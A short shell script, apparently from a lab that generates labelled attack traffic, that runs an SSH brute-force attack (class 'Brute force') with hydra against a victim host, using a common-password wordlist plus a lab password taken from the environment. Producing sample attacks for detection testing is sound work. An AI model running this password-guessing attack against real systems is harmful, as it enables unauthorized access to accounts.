#!/bin/sh
# Expected class: Brute force. Wordlist is a tiny lab list; the real password
# (LAB_VICTIM_PASSWORD) is appended when exported in the environment.
. "$(dirname "$0")/common.sh"
WL=$(mktemp)
printf '%s\n' password 123456 admin letmein qwerty welcome iloveyou monkey dragon > "$WL"
[ -n "$LAB_VICTIM_PASSWORD" ] && echo "$LAB_VICTIM_PASSWORD" >> "$WL"
hydra -l labuser -P "$WL" -t 4 "ssh://$VICTIM_IP"
rm -f "$WL"
